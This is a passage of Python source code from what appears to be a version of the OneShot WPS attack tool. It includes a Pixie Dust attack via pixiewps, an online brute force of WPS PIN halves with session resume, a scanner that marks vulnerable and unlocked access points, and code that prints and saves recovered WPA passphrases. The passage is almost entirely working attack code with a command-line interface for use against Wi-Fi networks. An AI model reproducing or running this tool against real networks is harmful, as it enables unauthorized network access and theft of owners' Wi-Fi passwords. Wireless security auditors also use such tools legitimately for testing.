            cmd = f"WPS_REG {bssid} {pin}"

        reply = self.sendAndReceive(cmd)
        if "OK" not in reply:
            self.connection_status.status = "WPS_FAIL"
            print(self._explain_wpas_not_ok_status(cmd, reply))
            return False

        target_bssid = (bssid or "").lower()
        while True:
            has_more = self.__handle_wpas(
                pixiemode=pixiemode,
                pbc_mode=pbc_mode,
                verbose=verbose,
                bssid=target_bssid,
            )
            if not has_more:
                break
            if self.connection_status.status in ("WSC_NACK", "GOT_PSK", "WPS_FAIL"):
                break

        self.sendOnly("WPS_CANCEL")
        return self.connection_status.status == "GOT_PSK"

    def single_connection(
        self,
        bssid: str | None = None,
        pin: str | None = None,
        pixiemode: bool = False,
        pbc_mode: bool = False,
        showpixiecmd: bool = False,
        pixieforce: bool = False,
        store_pin_on_fail: bool = False,
    ) -> bool:
        pin_file = self.pixiewps_dir / f"{(bssid or '').replace(':', '').upper()}.run"
        if not pin:
            if pixiemode and bssid:
                if pin_file.is_file():
                    t_pin = pin_file.read_text(encoding="utf-8").splitlines()[0].strip() if pin_file.read_text(encoding="utf-8").splitlines() else ""
                    if t_pin and input(f"[?] Use previously calculated PIN {t_pin}? [n/Y] ").strip().lower() != "n":
                        pin = t_pin
                if not pin:
                    pin = self.generator.getLikely(bssid) or "12345670"
            elif not pbc_mode and bssid:
                pin = self.__prompt_wpspin(bssid) or "12345670"

        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=True)
            bssid = self.connection_status.bssid
            pin = "<PBC mode>"
        elif store_pin_on_fail and bssid:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin or "")
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == "GOT_PSK":
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result and bssid:
                self.__saveResult(bssid, self.connection_status.essid, pin or "", self.connection_status.wpa_psk)
            if not pbc_mode and pin_file.is_file():
                pin_file.unlink(missing_ok=True)
            return True

        if pixiemode and bssid:
            if self.pixie_creds.got_all():
                calculated_pin = self.__runPixiewps(showcmd=showpixiecmd, full_range=pixieforce)
                if isinstance(calculated_pin, str) and calculated_pin:
                    return self.single_connection(
                        bssid,
                        calculated_pin,
                        pixiemode=False,
                        store_pin_on_fail=True,
                    )
                return False
            print("[!] Not enough data to run Pixie Dust attack")
            return False

        if store_pin_on_fail and bssid:
            self.__savePin(bssid, pin or "")
        return False

    def __first_half_bruteforce(self, bssid: str, f_half: str, delay: float | None = None) -> str | bool:
        checksum = self.generator.checksum
        cur = f_half
        while int(cur) < 10000:
            t = int(f"{cur}000")
            pin = f"{cur}000{checksum(t)}"
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print("[+] First half found")
                return cur
            if self.connection_status.status == "WPS_FAIL":
                print("[!] WPS transaction failed, re-trying last pin")
                continue
            cur = f"{int(cur) + 1:04d}"
            self.bruteforce.registerAttempt(cur)
            if delay:
                time.sleep(delay)
        print("[-] First half not found")
        return False

    def __second_half_bruteforce(self, bssid: str, f_half: str, s_half: str, delay: float | None = None) -> str | bool:
        checksum = self.generator.checksum
        cur_s = s_half
        while int(cur_s) < 1000:
            t = int(f"{f_half}{cur_s}")
            pin = f"{f_half}{cur_s}{checksum(t)}"
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            if self.connection_status.status == "WPS_FAIL":
                print("[!] WPS transaction failed, re-trying last pin")
                continue
            cur_s = f"{int(cur_s) + 1:03d}"
            self.bruteforce.registerAttempt(f"{f_half}{cur_s}")
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid: str, start_pin: str | None = None, delay: float | None = None, loop_mode: bool = False) -> None:
        session_file = self.sessions_dir / f"{bssid.replace(':', '').upper()}.run"
        if (not start_pin) or (len(start_pin) < 4):
            mask = "0000"
            if session_file.is_file():
                if input(f"[?] Restore previous session for {bssid}? [n/Y] ").strip().lower() != "n":
                    lines = session_file.read_text(encoding="utf-8").splitlines()
                    if lines and lines[0].strip():
                        mask = lines[0].strip()
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if isinstance(f_half, str) and self.connection_status.status != "GOT_PSK":
                    self.__second_half_bruteforce(bssid, f_half, "001", delay)
            elif len(mask) == 7:
                self.__second_half_bruteforce(bssid, mask[:4], mask[4:], delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\nAborting…")
            session_file.write_text(self.bruteforce.mask, encoding="utf-8")
            print(f"[i] Session saved in {session_file}")
            if loop_mode:
                raise

    def __print_with_indicators(self, level: str, msg: str) -> None:
        print(f"[{level}] [{self.lastPwr}] {msg}")

    def cleanup(self) -> None:
        if self._cleaned:
            return
        self._cleaned = True
        try:
            self.retsock.close()
        except Exception:
            pass
        if getattr(self, "wpas", None) is not None and self.wpas.poll() is None:
            try:
                self.wpas.terminate()
                self.wpas.wait(timeout=3)
            except Exception:
                try:
                    self.wpas.kill()
                except Exception:
                    pass
        try:
            Path(self.res_socket_file).unlink(missing_ok=True)
        except Exception:
            pass
        try:
            self._tmp_dir_obj.cleanup()
        except Exception:
            pass


class WiFiScanner:
    """Scanner for WPS-enabled access points using `iw`."""

    def __init__(self, interface: str, vuln_list: list[str] | None = None, reverse_scan: bool = False) -> None:
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.reverse_scan = reverse_scan

        reports_fname = SCRIPT_DIR / "reports" / "stored.csv"
        self.stored: list[tuple[str, str]] = []
        if reports_fname.is_file():
            with reports_fname.open("r", newline="", encoding="utf-8", errors="replace") as f_csv:
                reader = csv.reader(f_csv, delimiter=";", quoting=csv.QUOTE_ALL)
                next(reader, None)
                for row in reader:
                    if len(row) >= 3:
                        self.stored.append((row[1], row[2]))

    def iw_scanner(self) -> dict[int, dict[str, object]] | bool:
        networks: list[dict[str, object]] = []

        def handle_network(_line: str, match: re.Match[str]) -> None:
            networks.append(
                {
                    "Security type": "Unknown",
                    "WPS": False,
                    "WPS locked": False,
                    "Model": "",
                    "Model number": "",
                    "Device name": "",
                    "BSSID": match.group(1).upper(),
                }
            )

        def handle_essid(_line: str, match: re.Match[str]) -> None:
            if networks:
                networks[-1]["ESSID"] = _decode_escaped_ssid(match.group(1))

        def handle_level(_line: str, match: re.Match[str]) -> None:
            if networks:
                networks[-1]["Level"] = int(float(match.group(1)))

        def handle_security_type(_line: str, match: re.Match[str]) -> None:
            if not networks:
                return
            sec = str(networks[-1]["Security type"])
            kind = match.group(1)
            if kind == "capability":
                sec = "WEP" if "Privacy" in match.group(2) else "Open"
            elif sec == "WEP":
                if kind == "RSN":
                    sec = "WPA2"
                elif kind == "WPA":
                    sec = "WPA"
            elif sec == "WPA" and kind == "RSN":
                sec = "WPA/WPA2"
            elif sec == "WPA2" and kind == "WPA":
                sec = "WPA/WPA2"
            networks[-1]["Security type"] = sec

        def handle_wps(_line: str, match: re.Match[str]) -> None:
            if networks:
                networks[-1]["WPS"] = match.group(1)

        def handle_wps_locked(_line: str, match: re.Match[str]) -> None:
            if networks and int(match.group(1), 16):
                networks[-1]["WPS locked"] = True

        def handle_model(_line: str, match: re.Match[str]) -> None:
            if networks:
                networks[-1]["Model"] = _decode_escaped_ssid(match.group(1))

        def handle_model_number(_line: str, match: re.Match[str]) -> None:
            if networks:
                networks[-1]["Model number"] = _decode_escaped_ssid(match.group(1))

        def handle_device_name(_line: str, match: re.Match[str]) -> None:
            if networks:
                networks[-1]["Device name"] = _decode_escaped_ssid(match.group(1))

        proc = subprocess.run(
            ["iw", "dev", self.interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            encoding="utf-8",
            errors="replace",
            check=False,
        )
        matchers: dict[re.Pattern[str], Callable[[str, re.Match[str]], None]] = {
            re.compile(r"BSS (\S+)( )?\(on \w+\)"): handle_network,
            re.compile(r"SSID: (.*)"): handle_essid,
            re.compile(r"signal: ([+-]?([0-9]*[.])?[0-9]+) dBm"): handle_level,
            re.compile(r"(capability): (.+)"): handle_security_type,
            re.compile(r"(RSN):\t [*] Version: (\d+)"): handle_security_type,
            re.compile(r"(WPA):\t [*] Version: (\d+)"): handle_security_type,
            re.compile(r"WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)"): handle_wps,
            re.compile(r" [*] AP setup locked: (0x[0-9]+)"): handle_wps_locked,
            re.compile(r" [*] Model: (.*)"): handle_model,
            re.compile(r" [*] Model Number: (.*)"): handle_model_number,
            re.compile(r" [*] Device name: (.*)"): handle_device_name,
        }

        for raw_line in proc.stdout.splitlines():
            if raw_line.startswith("command failed:"):
                print("[!] Error:", raw_line)
                return False
            line = raw_line.strip("\t")
            for regexp, handler in matchers.items():
                match = regexp.match(line)
                if match:
                    handler(line, match)

        wps_networks = [net for net in networks if bool(net.get("WPS"))]
        if not wps_networks:
            return False

        wps_networks.sort(key=lambda item: int(item.get("Level", -999)), reverse=True)
        network_list = {(idx + 1): net for idx, net in enumerate(wps_networks)}

        def truncate_str(s: str, length: int, postfix: str = "…") -> str:
            original_width = wcwidth.wcswidth(s)
            if original_width <= length:
                return s + (" " * (length - original_width))

            postfix_width = max(0, wcwidth.wcswidth(postfix))
            max_allowed = max(0, length - postfix_width)

            current_width = 0
            truncated: list[str] = []
            for ch in s:
                char_width = max(0, wcwidth.wcswidth(ch))
                if current_width + char_width > max_allowed:
                    break
                truncated.append(ch)
                current_width += char_width

            result = "".join(truncated)
            if len(truncated) < len(s):
                result += postfix

            result_width = wcwidth.wcswidth(result)
            if result_width > length:
                current_width = 0
                safe_truncated: list[str] = []
                for ch in result:
                    char_width = max(0, wcwidth.wcswidth(ch))
                    if current_width + char_width > length:
                        break
                    safe_truncated.append(ch)
                    current_width += char_width
                safe_result = "".join(safe_truncated)
                if len(safe_result) < len(result) and wcwidth.wcswidth(safe_result + postfix) <= length:
                    safe_result += postfix
                result = safe_result
                result_width = wcwidth.wcswidth(result)

            return result + (" " * max(0, length - result_width))

        def colored(text: str, color: str | None = None) -> str:
            palette = {
                "green": "\033[92m{}\033[00m",
                "red": "\033[91m{}\033[00m",
                "yellow": "\033[93m{}\033[00m",
            }
            if color and color in palette:
                return palette[color].format(text)
            return text

        if self.vuln_list:
            print(
                f"Network marks: {colored('Possibly vulnerable', 'green')} | "
                f"{colored('WPS locked', 'red')} | {colored('Already stored', 'yellow')}"
            )
        print("Networks list:")
        print(f"{'#':<4} {'BSSID':<18} {'ESSID':<25} {'Sec.':<8} {'PWR':<4} {'WSC device name':<27} {'WSC model'}")

        items = list(network_list.items())
        if self.reverse_scan:
            items.reverse()

        for n, net in items:
            model = f"{net['Model']} {net['Model number']}".strip()
            essid = truncate_str(str(net.get("ESSID", "HIDDEN")), 25)
            device_name = truncate_str(str(net["Device name"]), 27)
            line = " ".join(
                [
                    truncate_str(f"{n})", 4),
                    truncate_str(str(net["BSSID"]), 18),
                    essid,
                    truncate_str(str(net["Security type"]), 8),
                    truncate_str(str(net.get("Level", "N/A")), 4),
                    device_name,
                    model,
                ]
            )
            if (str(net["BSSID"]), str(net.get("ESSID", "HIDDEN"))) in self.stored:
                print(colored(line, "yellow"))
            elif net["WPS locked"]:
                print(colored(line, "red"))
            elif self.vuln_list and (model in self.vuln_list):
                print(colored(line, "green"))
            else:
                print(line)

        return network_list

    def prompt_network(self) -> str | None:
        networks = self.iw_scanner()
        if not networks:
            print("[-] No WPS networks found.")
            return None
        while True:
            try:
                choice = input("Select target (press Enter to refresh): ").strip()
                if choice.lower() in ("r", "0", ""):
                    return self.prompt_network()
                idx = int(choice)
                if idx in networks:
                    return str(networks[idx]["BSSID"])
                raise IndexError
            except Exception:
                print("Invalid number")


def ifaceUp(iface: str, down: bool = False) -> bool:
    action = "down" if down else "up"
    res = subprocess.run(
        ["ip", "link", "set", iface, action],
        stdout=sys.stdout,
        stderr=sys.stdout,
        check=False,
    )
    return res.returncode == 0


def die(msg: str) -> None:
    sys.stderr.write(msg + "\n")
    sys.exit(1)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg",
        epilog="Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K",
    )
    parser.add_argument("-i", "--interface", type=str, required=True, help="Name of the interface to use")
    parser.add_argument("-b", "--bssid", type=str, help="BSSID of the target AP")
    parser.add_argument("-p", "--pin", type=str, help="Use the specified pin (arbitrary string or 4/8 digit pin)")
    parser.add_argument("-K", "--pixie-dust", action="store_true", help="Run Pixie Dust attack")
    parser.add_argument("-F", "--pixie-force", action="store_true", help="Run Pixiewps with --force option (bruteforce full range)")
    parser.add_argument("-X", "--show-pixie-cmd", action="store_true", help="Always print Pixiewps command")
    parser.add_argument("-B", "--bruteforce", action="store_true", help="Run online bruteforce attack")
    parser.add_argument("--pbc", "--push-button-connect", action="store_true", help="Run WPS push button connection")
    parser.add_argument("-d", "--delay", type=float, help="Set the delay between pin attempts")
    parser.add_argument("-w", "--write", action="store_true", help="Write credentials to the file on success")
    parser.add_argument("--iface-down", action="store_true", help="Down network interface when the work is finished")
    parser.add_argument(
        "--vuln-list",
        type=str,
        default=str(SCRIPT_DIR / "vulnwsc.txt"),
        help="Use custom file with vulnerable devices list",
    )
    parser.add_argument("-l", "--loop", action="store_true", help="Run in a loop")
    parser.add_argument(
        "-r",
        "--reverse-scan",
        action="store_true",
        help="Reverse order of networks in the list of networks. Useful on small displays",
    )
    parser.add_argument(
        "--mtk-wifi",
        action="store_true",
        help="Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit "
        "(for internal Wi-Fi adapters implemented in MediaTek SoCs). "
        "Turn off Wi-Fi in the system settings before using this.",
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.geteuid() != 0:
        die("Run it as root")
    if shutil.which("wpa_supplicant") is None:
        die("wpa_supplicant not found in PATH")

    wmt_wifi_device = Path("/dev/wmtWifi")
    if args.mtk_wifi:
        if not wmt_wifi_device.is_char_device():
            die(
                "Unable to activate MediaTek Wi-Fi interface device (--mtk-wifi): "
                "/dev/wmtWifi does not exist or it is not a character device"
            )
        wmt_wifi_device.chmod(0o644)
        wmt_wifi_device.write_text("1", encoding="utf-8")

    if not ifaceUp(args.interface):
        die(f'Unable to up interface "{args.interface}"')

    target_bssid = args.bssid
    try:
        while True:
            companion: Companion | None = None
            try:
                if args.pbc:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                    companion.single_connection(bssid=target_bssid, pbc_mode=True)
                else:
                    if not target_bssid:
                        vuln_list: list[str] = []
                        vuln_path = Path(args.vuln_list)
                        if vuln_path.is_file():
                            vuln_list = vuln_path.read_text(encoding="utf-8").splitlines()
                        scanner = WiFiScanner(args.interface, vuln_list=vuln_list, reverse_scan=args.reverse_scan)
                        if not args.loop:
                            print("[*] BSSID not specified (--bssid) — scanning for available networks")
                        target_bssid = scanner.prompt_network()

                    if target_bssid:
                        companion = Companion(args.interface, args.write, print_debug=args.verbose)
                        if args.bruteforce:
                            companion.smart_bruteforce(target_bssid, args.pin, args.delay, loop_mode=args.loop)
                        else:
                            companion.single_connection(
                                target_bssid,
                                args.pin,
                                args.pixie_dust,
                                args.pbc,
                                args.show_pixie_cmd,
                                args.pixie_force,
                            )
                if not args.loop:
                    break
                target_bssid = None
            except KeyboardInterrupt:
                if args.loop:
                    if input("\n[?] Exit the script (otherwise continue to AP scan)? [N/y] ").strip().lower() == "y":
                        print("Aborting…")
                        break
                    target_bssid = None
                else:
                    print("\nAborting…")
                    break
            finally:
                if companion is not None:
                    companion.cleanup()
    finally:
        if args.iface_down:
            ifaceUp(args.interface, down=True)
        if args.mtk_wifi and wmt_wifi_device.exists():
            try:
                wmt_wifi_device.write_text("0", encoding="utf-8")
            except Exception:
                pass


if __name__ == "__main__":
    main()
